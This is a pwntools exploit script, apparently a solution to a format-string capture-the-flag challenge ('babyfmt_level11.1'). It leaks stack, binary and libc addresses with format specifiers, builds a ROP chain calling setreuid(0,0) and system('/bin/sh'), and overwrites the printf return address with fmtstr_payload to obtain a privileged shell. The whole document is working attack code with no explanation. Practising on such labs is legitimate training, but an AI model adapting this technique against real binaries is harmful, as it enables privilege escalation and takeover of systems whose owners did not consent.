from pwn import *
BINARY = "/challenge/babyfmt_level11.1"

context.arch = 'amd64'



padlen = 0
off = 64
# context.terminal = ['tmux', 'splitw', '-h']
# p = gdb.debug(BINARY, gdbscript="source /opt/gef/gef.py")
p = process(BINARY)

# write func to exit@got
# leak stack addr
payload = b"%186$p %187$p %197$p"
p.send(payload)
p.recvuntil(b"Your input is:")
p.recvuntil(b"\n")
output = p.recv()[0:44]
print(output)

output = output.split(b" ")
main_rbp = int(output[0], 16)
binary_base = int(output[1], 16) - 0x15B7
libc_base = int(output[2], 16) - 0x24083

binary = ELF(BINARY)
libc = ELF(p.libc.path)
binary.address = binary_base
libc.address = libc_base
bin_sh = next(libc.search(b'/bin/sh'))
libc_rop = ROP(libc)
libc_rop.setreuid(0, 0)
libc_rop.system(bin_sh)

print_ret_addr = main_rbp - 0x5f8
payload = b"A" * padlen + fmtstr_payload(off, {print_ret_addr: libc_rop.chain()}, numbwritten = 80)
p.send(payload)

p.interactive()